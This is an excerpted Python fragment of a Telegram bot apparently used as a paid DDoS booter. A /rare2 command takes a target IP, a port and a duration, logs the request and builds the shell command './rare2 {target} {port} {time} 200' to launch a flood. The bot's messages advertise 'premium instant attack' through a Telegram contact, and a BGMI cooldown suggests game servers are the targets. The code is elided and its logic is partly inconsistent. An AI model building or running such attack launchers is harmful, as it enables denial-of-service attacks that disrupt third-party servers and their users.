...
# Handler for /rare2 command
@bot.message_handler(commands=['rare2'])
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /rare2 Command Again buy premium instant attack with zero sec dm @RARExxOWNER."
                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                record_command_logs(user_id, '/rare2', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./rare2 {target} {port} {time} 200"
